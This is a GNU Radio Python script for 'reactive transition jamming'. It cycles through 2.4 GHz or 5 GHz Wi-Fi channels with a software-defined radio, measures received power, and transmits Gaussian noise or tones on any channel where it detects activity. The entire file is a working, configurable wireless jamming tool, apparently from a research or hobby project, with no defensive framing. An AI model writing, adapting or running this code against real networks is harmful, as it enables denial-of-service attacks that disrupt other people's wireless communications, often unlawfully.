#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#
# SPDX-License-Identifier: GPL-3.0
#
# GNU Radio Python Flow Graph
# Title: Reactive Transition Jamming
# Original Author: Abubakar Sani Ali
# Modified by: Borna Jukic
# GNU Radio version: 3.8.1.0

###################################################################################
# Importing Libraries
###################################################################################

import time
from gnuradio import gr
from gnuradio import blocks
from gnuradio import analog
from gnuradio import fft
from gnuradio.fft import window
from gnuradio import filter
from gnuradio.filter import firdes
from statistics import mean
import osmosdr
import sys
import numpy as np


###################################################################################
# Global Configuration (Hardcoded for Reactive Transition Jamming)
###################################################################################

BAND = 1                  # Select Frequency operating range (1=2.4GHz, 2=5GHz) 
WAVEFORM = 3              # Select Jamming waveform (1=single tone, 2=swept sine, 3=gaussian noise)
POWER = 6                 # Enter Jammer transmit power in dBm (Min = -40dBm, Max = 13dBm)
T_JAMMING = 5             # Enter channel jamming duration in sec
DURATION = 200            # Enter total program execution duration in seconds
T_SENSING = 0.05          # Channel sensing time
THRESHOLD = 0.0002        # Power threshold for activity detection


###################################################################################
# Sensing Channel Activity Function
###################################################################################

def sense(freq, delay):
    samp_rate = 20e6  
    sdr_bandwidth = 20e6  

    tb = gr.top_block()

    # Source block
    osmosdr_source = osmosdr.source(
        args="numchan=" + str(1) + " " + ""
    )
    osmosdr_source.set_time_unknown_pps(osmosdr.time_spec_t())
    osmosdr_source.set_sample_rate(samp_rate)
    osmosdr_source.set_center_freq(freq, 0)
    osmosdr_source.set_freq_corr(0, 0)
    osmosdr_source.set_gain(0, 0)
    osmosdr_source.set_if_gain(16, 0)
    osmosdr_source.set_bb_gain(16, 0)
    osmosdr_source.set_antenna('', 0)
    osmosdr_source.set_bandwidth(sdr_bandwidth, 0)

    # Inbetween blocks
    low_pass_filter = filter.fir_filter_ccf(
        1,
        firdes.low_pass(
            1,
            samp_rate,
            75e3,
            25e3,
            window.WIN_HAMMING,
            6.76))
    complex_to_mag_squared = blocks.complex_to_mag_squared(1)

    # Sink block
    file_sink = blocks.file_sink(gr.sizeof_float * 1, 'output.bin', False)
    file_sink.set_unbuffered(True)

    # Connecting Blocks
    tb.connect(osmosdr_source, low_pass_filter)
    tb.connect(low_pass_filter, complex_to_mag_squared)
    tb.connect(complex_to_mag_squared, file_sink)

    tb.start()
    time.sleep(delay)
    tb.stop()
    tb.wait()


###################################################################################
# Jamming Channel Function
###################################################################################

def jam(freq, waveform, power, delay=1):
    print(f"\n[!] The frequency currently jammed is: {freq / 1e6} MHz")
    samp_rate = 20e6  
    sdr_bandwidth = 20e6  
    RF_gain, IF_gain = set_gains(power)  

    tb = gr.top_block()

    # Waveform selection
    if waveform == 1:
        source = analog.sig_source_c(samp_rate, analog.GR_SIN_WAVE, 1000, 1, 0, 0)
    elif waveform == 2:
        source = analog.sig_source_f(samp_rate, analog.GR_SIN_WAVE, 1000, 1, 0, 0)
    elif waveform == 3:
        source = analog.noise_source_c(analog.GR_GAUSSIAN, 1.0, 1)
    else:
        print("Invalid waveform selection.")
        return

    freq_mod = analog.frequency_modulator_fc(1)
    osmosdr_sink = osmosdr.sink(
        args="numchan=" + str(1) + " " + ""
    )
    osmosdr_sink.set_time_unknown_pps(osmosdr.time_spec_t())
    osmosdr_sink.set_sample_rate(samp_rate)
    osmosdr_sink.set_center_freq(freq, 0)
    osmosdr_sink.set_freq_corr(0, 0)
    osmosdr_sink.set_gain(RF_gain, 0)
    osmosdr_sink.set_if_gain(IF_gain, 0)
    osmosdr_sink.set_bb_gain(20, 0)
    osmosdr_sink.set_antenna('', 0)
    osmosdr_sink.set_bandwidth(sdr_bandwidth, 0)

    # Connecting Blocks
    if waveform == 2:
        tb.connect(source, freq_mod, osmosdr_sink)
    else:
        tb.connect(source, osmosdr_sink)

    tb.start()
    if delay != 0:
        time.sleep(delay)
        tb.stop()
        tb.wait()
    else:
        tb.wait()


##################################################################################
# Set Frequency
##################################################################################

def set_frequency(channel, ch_dist, init_freq):
    if channel == 1:
        freq = init_freq
    else:
        freq = init_freq + (channel - 1) * ch_dist

    return freq


##################################################################################
# Set RF Gains
##################################################################################

def set_gains(power):
    if -40 <= power <= 5:
        RF_gain = 0
        if power < -5:
            IF_gain = power + 40
        elif -5 <= power <= 2:
            IF_gain = power + 41
        elif 2 < power <= 5:
            IF_gain = power + 42
    elif power > 5:
        RF_gain = 14
        IF_gain = power + 34
    else:
        print("Invalid Jammer Transmit power.")
        RF_gain = 0
        IF_gain = 16

    return RF_gain, IF_gain


##################################################################################
# Detect Activity Function
##################################################################################

def detect():
    try:
        with open("output.bin", mode='rb') as file:
            fileContent = file.read()
            samples = np.memmap("output.bin", mode="r", dtype=np.float32)
            if len(samples) == 0:
                return 0.0
        p = 0.5 * mean(samples)
        return p
    except Exception:
        return 0.0


##################################################################################
# Main Function (Reactive Transition Jamming Execution)
##################################################################################

if __name__ == "__main__":
    if BAND == 1:
        ch_dist = 2 * 10e5  # Original scaling for 2.4 GHz band
        init_freq = 2412e6
        lst_freq = 2484e6
    elif BAND == 2:
        ch_dist = 20e6      # Original scaling for 5 GHz band
        init_freq = 5180e6
        lst_freq = 5320e6
    else:
        print("Invalid band selection.")
        sys.exit(1)

    n_channels = int((lst_freq - init_freq) // ch_dist)
    if T_JAMMING > DURATION:
        T_JAMMING = DURATION

    print(f"Starting reactive transition jamming on band {BAND}...")
    print(f"Total channels to scan: {n_channels + 1}")

    channel = 1  
    start_time = time.time()

    while True:
        freq = set_frequency(channel, ch_dist, init_freq)
        print(f"Sensing channel {channel} at frequency: {freq / 1e6} MHz")

        # 1. Sense current channel
        sense(freq, T_SENSING)
        rx_power = detect()
        print(f"Measured power: {rx_power:.6f}")

        # 2. Reactive check: If power is above threshold, jam the channel
        if rx_power > THRESHOLD:
            print(f"[!] Activity detected! Starting jamming...")
            jam(freq, WAVEFORM, POWER, T_JAMMING)
        else:
            print("No activity, skipping channel...")

        # Move to next channel
        channel = 1 if channel > n_channels else channel + 1

        # Check execution time
        jamming_time_per_run = time.time() - start_time
        if jamming_time_per_run >= DURATION:
            print("Execution duration completed.")
            break